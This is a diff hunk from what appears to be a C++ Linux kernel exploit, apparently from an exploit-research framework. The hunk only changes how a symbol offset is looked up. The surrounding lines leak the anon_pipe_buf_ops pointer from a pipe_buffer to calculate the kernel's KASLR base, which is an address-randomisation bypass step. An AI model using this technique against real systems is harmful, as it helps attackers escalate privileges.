@@ -72,7 +72,7 @@ int main(int argc, const char** argv) {
     pipe_buffer leaked_pipe = *(pipe_buffer*) pipe_leak.data();
     printf("[+] Leaked anon_pipe_buf_ops = 0x%lx\n", leaked_pipe.ops);
 
-    auto kaslr_base = leaked_pipe.ops - target.GetSymbolOffset(SymbolId::ANON_PIPE_BUF_OPS);
+    auto kaslr_base = leaked_pipe.ops - target.GetSymbolOffset("anon_pipe_buf_ops");
     printf("[+] KASLR base = 0x%lx\n", kaslr_base);
     check_kaslr_base(kaslr_base);
 
